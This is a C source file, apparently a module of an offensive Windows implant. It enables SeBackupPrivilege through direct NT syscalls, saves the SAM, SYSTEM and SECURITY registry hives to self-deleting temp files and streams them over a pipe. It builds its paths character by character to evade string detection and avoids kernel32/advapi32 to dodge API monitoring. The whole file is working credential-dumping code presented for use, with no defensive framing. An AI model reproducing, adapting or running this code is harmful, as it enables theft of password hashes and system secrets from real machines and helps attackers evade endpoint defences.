/**
 * Registry hive dump — SAM, SYSTEM, SECURITY via NT syscalls only.
 * No kernel32/advapi32 dependencies.
 * Temp files use FILE_DELETE_ON_CLOSE for automatic cleanup.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"
#include "../include/agent.h"

static inline void zero_mem(void *dst, SIZE_T len) {
    BYTE *p = (BYTE *)dst;
    while (len--) *p++ = 0;
}

/* ── Enable SeBackupPrivilege ──────────────────────────────── */

BOOL init_registry(void) {
    HANDLE token = NULL;
    NTSTATUS status = sys_NtOpenProcessToken(
        (HANDLE)-1,
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &token
    );
    if (!NT_SUCCESS(status)) return FALSE;

    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid.LowPart  = SE_BACKUP_PRIVILEGE_LUID_LOW;
    tp.Privileges[0].Luid.HighPart = SE_BACKUP_PRIVILEGE_LUID_HIGH;
    tp.Privileges[0].Attributes    = SE_PRIVILEGE_ENABLED;

    status = sys_NtAdjustPrivilegesToken(token, FALSE, &tp, sizeof(tp), NULL, NULL);
    sys_NtClose(token);

    return NT_SUCCESS(status);
}

/* ── Build temp file NT path on stack ──────────────────────── */

static int build_temp_path(wchar_t *buf, DWORD tick, int index) {
    int off = 0;
    buf[off++] = L'\\'; buf[off++] = L'?'; buf[off++] = L'?'; buf[off++] = L'\\';
    buf[off++] = L'C';  buf[off++] = L':'; buf[off++] = L'\\';
    buf[off++] = L'W';  buf[off++] = L'i'; buf[off++] = L'n'; buf[off++] = L'd';
    buf[off++] = L'o';  buf[off++] = L'w'; buf[off++] = L's'; buf[off++] = L'\\';
    buf[off++] = L'T';  buf[off++] = L'e'; buf[off++] = L'm'; buf[off++] = L'p';
    buf[off++] = L'\\';

    for (int i = 28; i >= 0; i -= 4) {
        int nibble = (tick >> i) & 0xF;
        buf[off++] = (wchar_t)(nibble < 10 ? L'0' + nibble : L'a' + nibble - 10);
    }
    buf[off++] = (wchar_t)(L'0' + index);
    buf[off] = L'\0';
    return off;
}

/* ── Build registry key path on stack ──────────────────────── */

static int build_key_path(wchar_t *buf, const wchar_t *suffix, int suffix_len) {
    int off = 0;
    buf[off++] = L'\\';
    buf[off++] = L'R'; buf[off++] = L'e'; buf[off++] = L'g'; buf[off++] = L'i';
    buf[off++] = L's'; buf[off++] = L't'; buf[off++] = L'r'; buf[off++] = L'y';
    buf[off++] = L'\\';
    buf[off++] = L'M'; buf[off++] = L'a'; buf[off++] = L'c'; buf[off++] = L'h';
    buf[off++] = L'i'; buf[off++] = L'n'; buf[off++] = L'e'; buf[off++] = L'\\';
    for (int i = 0; i < suffix_len; i++)
        buf[off++] = suffix[i];
    buf[off] = L'\0';
    return off;
}

/* ── Dump one hive ──────────────────────────────────────────── */

static BOOL dump_one_hive(const wchar_t *key_path, int key_len,
                          HANDLE pipe, DWORD tick, int index) {
    UNICODE_STRING key_us;
    key_us.Length        = (USHORT)(key_len * sizeof(wchar_t));
    key_us.MaximumLength = (USHORT)((key_len + 1) * sizeof(wchar_t));
    key_us.Buffer        = (PWSTR)key_path;

    OBJECT_ATTRIBUTES key_oa;
    InitializeObjectAttributes(&key_oa, &key_us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hKey = NULL;
    NTSTATUS status = sys_NtOpenKey(&hKey, KEY_READ, &key_oa);
    if (!NT_SUCCESS(status)) {
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        return FALSE;
    }

    wchar_t temp_path[64];
    int temp_len = build_temp_path(temp_path, tick, index);

    UNICODE_STRING file_us;
    file_us.Length        = (USHORT)(temp_len * sizeof(wchar_t));
    file_us.MaximumLength = (USHORT)((temp_len + 1) * sizeof(wchar_t));
    file_us.Buffer        = temp_path;

    OBJECT_ATTRIBUTES file_oa;
    InitializeObjectAttributes(&file_oa, &file_us, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    HANDLE hFile = NULL;
    status = sys_NtCreateFile(
        &hFile,
        0xC0110000, /* GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE */
        &file_oa, &iosb, NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE,
        NULL, 0
    );
    if (!NT_SUCCESS(status)) {
        sys_NtClose(hKey);
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        return FALSE;
    }

    status = sys_NtSaveKey(hKey, hFile);
    sys_NtClose(hKey);
    if (!NT_SUCCESS(status)) {
        sys_NtClose(hFile);
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        return FALSE;
    }

    FILE_STANDARD_INFORMATION fsi;
    zero_mem(&fsi, sizeof(fsi));
    status = sys_NtQueryInformationFile(hFile, &iosb, &fsi, sizeof(fsi),
                                         FileStandardInformation);
    if (!NT_SUCCESS(status) || fsi.EndOfFile.QuadPart == 0) {
        sys_NtClose(hFile);
        DWORD zero = 0;
        write_pipe(pipe, &zero, 4);
        return FALSE;
    }

    DWORD file_size = (DWORD)fsi.EndOfFile.QuadPart;
    write_pipe(pipe, &file_size, 4);

    PVOID buf = NULL;
    SIZE_T buf_size = 65536;
    status = sys_NtAllocateVirtualMemory((HANDLE)-1, &buf, 0, &buf_size,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        sys_NtClose(hFile);
        return FALSE;
    }

    LARGE_INTEGER offset;
    offset.QuadPart = 0;
    DWORD remaining = file_size;

    while (remaining > 0) {
        DWORD to_read = remaining > 65536 ? 65536 : remaining;
        IO_STATUS_BLOCK read_iosb;
        status = sys_NtReadFile(hFile, NULL, NULL, NULL, &read_iosb,
                                buf, to_read, &offset, NULL);
        if (!NT_SUCCESS(status)) break;
        DWORD bytes_read = (DWORD)read_iosb.Information;
        if (bytes_read == 0) break;
        write_pipe(pipe, buf, bytes_read);
        offset.QuadPart += bytes_read;
        remaining -= bytes_read;
    }

    SIZE_T free_size = 0;
    sys_NtFreeVirtualMemory((HANDLE)-1, &buf, &free_size, MEM_RELEASE);
    sys_NtClose(hFile);

    return remaining == 0;
}

/* ── Dump all three hives ──────────────────────────────────── */

BOOL dump_registry_hives(HANDLE pipe) {
    DWORD tick = get_tick();
    wchar_t path[64];
    int len;

    wchar_t s0[] = { L'S', L'Y', L'S', L'T', L'E', L'M' };
    len = build_key_path(path, s0, 6);
    dump_one_hive(path, len, pipe, tick, 0);

    wchar_t s1[] = { L'S', L'A', L'M' };
    len = build_key_path(path, s1, 3);
    dump_one_hive(path, len, pipe, tick, 1);

    wchar_t s2[] = { L'S', L'E', L'C', L'U', L'R', L'I', L'T', L'Y' };
    len = build_key_path(path, s2, 8);
    dump_one_hive(path, len, pipe, tick, 2);

    return TRUE;
}
